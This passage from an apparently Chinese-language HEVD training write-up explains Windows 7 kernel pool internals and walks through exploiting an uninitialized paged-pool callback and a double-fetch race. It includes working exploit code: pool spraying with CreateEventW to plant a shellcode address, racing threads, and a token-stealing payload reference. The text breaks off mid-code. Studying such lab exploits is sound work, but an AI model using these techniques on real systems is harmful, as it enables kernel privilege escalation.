<span class="comment">//0x18</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> <span class="title">Type</span>;</span>                                                   <span class="comment">//0x1c</span></span><br><span class="line">    ULONG Tag;                                                              <span class="comment">//0x20</span></span><br><span class="line">    ULONG Size;                                                             <span class="comment">//0x24</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>//分配函数</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* (*AllocateEx)(<span class="keyword">enum</span> _POOL_TYPE arg1, ULONG arg2, ULONG arg3, <span class="keyword">struct</span> _LOOKASIDE_LIST_EX* arg4); <span class="comment">//0x28</span></span><br><span class="line">        VOID* (*Allocate)(<span class="keyword">enum</span> _POOL_TYPE arg1, ULONG arg2, ULONG arg3);    <span class="comment">//0x28</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span>//释放函数</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID (*FreeEx)(VOID* arg1, <span class="keyword">struct</span> _LOOKASIDE_LIST_EX* arg2);        <span class="comment">//0x2c</span></span><br><span class="line">        VOID (*Free)(VOID* arg1);                                           <span class="comment">//0x2c</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ListEntry</span>;</span>                                           <span class="comment">//0x30//就是 GENERAL_LOOKASIDE 双向链表</span></span><br><span class="line">    ULONG LastTotalAllocates;                                               <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LastAllocateMisses;                                           <span class="comment">//0x3c</span></span><br><span class="line">        ULONG LastAllocateHits;                                             <span class="comment">//0x3c</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Future[<span class="number">2</span>];                                                        <span class="comment">//0x40</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>大致是这个样子：</p>
<p><img src="/2023/08/12/2023-8-HEVD/3.jpg" alt="alt 3"></p>
<p>当使用 <code>ExAllocatePoolWithTag</code> 申请一个小块内存时，系统会首先尝试从 <code>KPRCB</code> 中的 <code>PP(N)PagedLookasideList</code> 分配内存。在分配内存时，后备列表中的内存块只提供满足大小符合的申请，否则不予处理</p>
<hr>
<p>Windows 7 下的<code>Lookaside Lists</code>快表最大为0x20，最多有256个块，这里需要修改快表的结构，因为申请池一开始是使用快表，如果快表不合适才会去调用空表(ListHeads)</p>
<h2 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>申请了一块分页池，<code>UserBuffer</code>给了<code>v2</code>，判断是否等于 <code>0xBAD0B0B0</code> ，如果相等则给回调函数赋值然后执行，如果不相等则直接调用回调函数，所以要做的就是在这里写为<code>shellcode</code>的地址即可：    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerUninitializedMemoryPagedPool</span><span class="params">(<span class="type">void</span> *UserBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  _UNINITIALIZED_MEMORY_POOL *UninitializedMemory; <span class="comment">// [esp+14h] [ebp-1Ch] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0xF0</span>u, <span class="number">1u</span>);</span><br><span class="line">  UninitializedMemory = ExAllocatePoolWithTag(PagedPool, <span class="number">0xF0</span>u, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( UninitializedMemory )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;PagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">240</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UninitializedMemory);</span><br><span class="line">    v2 = *UserBuffer;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserValue: 0x%p\n&quot;</span>, *UserBuffer);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory Address: 0x%p\n&quot;</span>, &amp;UninitializedMemory);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      UninitializedMemory-&gt;Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">      UninitializedMemory-&gt;Callback = UninitializedMemoryPagedPoolObjectCallback;</span><br><span class="line">      <span class="built_in">memset</span>(UninitializedMemory-&gt;Buffer, <span class="number">65</span>, <span class="keyword">sizeof</span>(UninitializedMemory-&gt;Buffer));</span><br><span class="line">      UninitializedMemory-&gt;Buffer[<span class="number">57</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Uninitialized Memory in PagedPool\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( UninitializedMemory )</span><br><span class="line">    &#123;</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory-&gt;Value: 0x%p\n&quot;</span>, UninitializedMemory-&gt;Value);</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory-&gt;Callback: 0x%p\n&quot;</span>, UninitializedMemory-&gt;Callback);</span><br><span class="line">      UninitializedMemory-&gt;Callback();</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">    result = <span class="number">-1073741801</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中的<code>UninitializedMemory</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNINITIALIZED_HEAP_VARIABLE</span> &#123;</span></span><br><span class="line">        ULONG_PTR Value;</span><br><span class="line">        FunctionPointer Callback;</span><br><span class="line">        ULONG_PTR Buffer[<span class="number">58</span>];</span><br><span class="line">&#125; UNINITIALIZED_HEAP_VARIABLE, *PUNINITIALIZED_HEAP_VARIABLE;</span><br><span class="line"><span class="comment">//4 + 4 + 58 * 4 + pool header = 248 &lt; 256</span></span><br></pre></td></tr></table></figure>

<p>所以<code>UninitializedMemory</code> 属于小块内存，系统会首先尝试从 <code>PPPagedLookasideList</code> 中分配申请的换页池</p>
<p>接下来要做的就是使 <code>PPPagedLookasideList</code> 中填满脏空闲内存块，之后<code>UninitializedMemory</code> 会从<code>PPPagedLookasideList </code>中申请换页池块，发生未初始化变量调用的时候，就会执行 <code>shellcode</code> 了。</p>
<h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>之前堆喷射用的函数<code>CreateEventA</code>，但是这里是分页池而不是非分页池</p>
<p>事件对象本身分配给了非分页池，但是最后一个参数<code>LPCTSTR</code>类型的<code>lpName</code>实际上是在分页池上分配的，并且可以操控</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateEventA</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span><br><span class="line"><span class="params">  BOOL                  bManualReset,</span></span><br><span class="line"><span class="params">  BOOL                  bInitialState,</span></span><br><span class="line"><span class="params">  LPCSTR                lpName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这里要使用<code>CreateEventW</code> 而不是 <code>CreateEventA</code>，因为地址中总会出现 00，用 <code>CreateEventA</code> 的话字符串会被截断，用 <code>CreateEventW</code> 的话要遇到 00 00 才会被截断。</p>
<p>这里还需要指定<code>lpName</code>都不相等，因为如果每个 <code>lpName</code> 都相等的话，你就算调用再多次 <code>CreateEventW</code>，到最后换页池中也只存在着一块 <code>lpName</code>（因为是字符串，只要有一份就够了），也就是说到最后 <code>PPPagedLookasideList</code> 248字节链上只会存在一块空闲换页池</p>
<p>源码中堆结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNINITIALIZED_HEAP_VARIABLE</span> &#123;</span></span><br><span class="line">        ULONG_PTR Value;</span><br><span class="line">        FunctionPointer Callback;</span><br><span class="line">        ULONG_PTR Buffer[<span class="number">58</span>];</span><br><span class="line">&#125; UNINITIALIZED_HEAP_VARIABLE, *PUNINITIALIZED_HEAP_VARIABLE;</span><br><span class="line"><span class="comment">//4 + 4 + 58 * 4 + pool header = 248 &lt; 256</span></span><br></pre></td></tr></table></figure>

<p>回调函数在+4的位置</p>
<p>需要注意的：</p>
<ul>
<li><strong>Lookaside</strong>表在系统启动2分钟之后启动，所以需要等等</li>
<li><strong>Lookaside</strong>列表的最大块大小是 0x20，它最多只能管理 256 个块，之后任何额外的块都由 ListHead<strong>管理</strong></li>
<li><code>lpName</code>不应该包含任何 NULL 字符，因为这会改变<code>lpName</code>的长度，并且漏洞利用将会失败</li>
</ul>
<p>流程：</p>
<ul>
<li>使用<code>CreateEventW</code>创建事件，其中第四个参数需要按照源码中<code>_UNINITIALIZED_HEAP_VARIABLE</code>结构体来填写：偏移为4的地方写成shellcode地址，然后保证第四个参数每个都不一样，再额外修改一点不相关的就行</li>
<li>释放申请的256个池</li>
<li>接下来与驱动交互的时候，申请出来的池就会执行shellcode。（未初始化池变量）</li>
</ul>
<h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">shellCode</span><span class="params">()</span>;</span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE Event_OBJECT[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// char lpName[0xf0] = &#123; 0 &#125;;</span></span><br><span class="line">    WCHAR lpName[<span class="number">0xf0</span> / <span class="number">2</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 一个Unicode是2个字节</span></span><br><span class="line">    <span class="built_in">memset</span>(lpName, <span class="string">&#x27;\x41&#x27;</span>, <span class="keyword">sizeof</span>(lpName));</span><br><span class="line">    *(PDWORD32)(buf) = <span class="number">0xBAD0B0B0</span> + <span class="number">1</span>; <span class="comment">// 为了不等于0xBAD0B0B0</span></span><br><span class="line">    HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0x3</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lpName is in 0x%p\n&quot;</span>, lpName);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//**************构造池块**************</span></span><br><span class="line">        *(PDWORD)((<span class="type">char</span> *)lpName + <span class="number">0x4</span>) = (DWORD)&amp;shellCode; </span><br><span class="line">        *(PDWORD)((<span class="type">char</span> *)lpName + <span class="number">0xf0</span> - <span class="number">1</span>) = i;</span><br><span class="line">        Event_OBJECT[i] = CreateEventW(<span class="literal">NULL</span>, FALSE, FALSE, lpName);</span><br><span class="line">        <span class="comment">//**************构造池块**************</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(Event_OBJECT[i]); <span class="comment">// 将创建的池块释放，释放的池块就为我们构造的shellcode地址</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x222033</span>, buf, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line">    CreateCmd();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="12-TriggerDoubleFetch"><a href="#12-TriggerDoubleFetch" class="headerlink" title="12.TriggerDoubleFetch"></a>12.TriggerDoubleFetch</h1><p>条件竞争漏洞</p>
<blockquote>
<p>在多线程访问临界区的情况下，使用进程互斥可以使多个线程不能同时访问操作关键区的变量，条件竞争漏洞就源于没有对可能会被多个线程访问的变量进行保护，导致多重访问使得在一次操作中，操作的值在中间发生了变化。</p>
</blockquote>
<h2 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接看源码，安全操作和含漏洞的代码区别在于：</p>
<p>安全的代码使用局部变量保存了用户传来的值，而不安全版本直接从用户内存去读取这个值</p>
<p>如果用户内存的这个结构的值是变化的，当校验的时候，Size合法，当复制的时候Size不合法，则可能造成缓冲区栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">    UserBuffer = UserDoubleFetch-&gt;Buffer;</span><br><span class="line">    UserBufferSize = UserDoubleFetch-&gt;Size;</span><br><span class="line"></span><br><span class="line">    ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG) __alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserBufferSize &gt; <span class="keyword">sizeof</span>(KernelBuffer))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    UserBuffer = UserDoubleFetch-&gt;Buffer;</span><br><span class="line">    UserBufferSize = UserDoubleFetch-&gt;Size;</span><br><span class="line"></span><br><span class="line">    ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG) __alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserDoubleFetch-&gt;Size &gt; <span class="keyword">sizeof</span>(KernelBuffer))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line">    RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>一个线程用来发起正常请求，一个线程用来修改Size大小：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">FlippingThread</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        UserBuffer-&gt;Size = <span class="number">0x900</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">RacingThread</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">        UserBuffer-&gt;Size = <span class="number">0x100</span>;</span><br><span class="line">        DeviceIoControl(hDevice, <span class="number">0x222037</span>, (LPVOID)UserBuffer, UserBufferSize, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>确定偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *randomSeries = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">	hDevice = ::CreateFileW(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, <span class="number">0</span>, nullptr);</span><br><span class="line">	UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);</span><br><span class="line">	UserBuffer-&gt;Buffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, <span class="number">0x900</span>);</span><br><span class="line">	RtlCopyMemory((<span class="type">void</span> *)UserBuffer-&gt;Buffer, randomSeries, <span class="number">0x900</span>);</span><br><span class="line"></span><br><span class="line">	HANDLE hThreadRacing[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	HANDLE hThreadFlipping[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		hThreadRacing[i] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)RacingThread, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line">		hThreadFlipping[i] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, 